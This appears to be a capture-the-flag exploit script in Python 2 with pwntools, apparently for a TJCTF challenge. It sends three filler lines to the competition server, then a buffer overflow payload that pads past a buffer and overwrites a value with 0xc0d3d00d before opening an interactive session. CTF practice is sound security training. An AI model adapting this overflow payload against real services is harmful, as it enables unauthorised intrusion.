from pwn import *

p = remote('p1.tjctf.org', 8002)


for i in range(3):
    p.recvrepeat(1)
    p.sendline('test')

print '#######################3'
print p.recvrepeat(1)

p.sendline('a'*(0x80-0xc)+p32(0xc0d3d00d))

p.interactive()
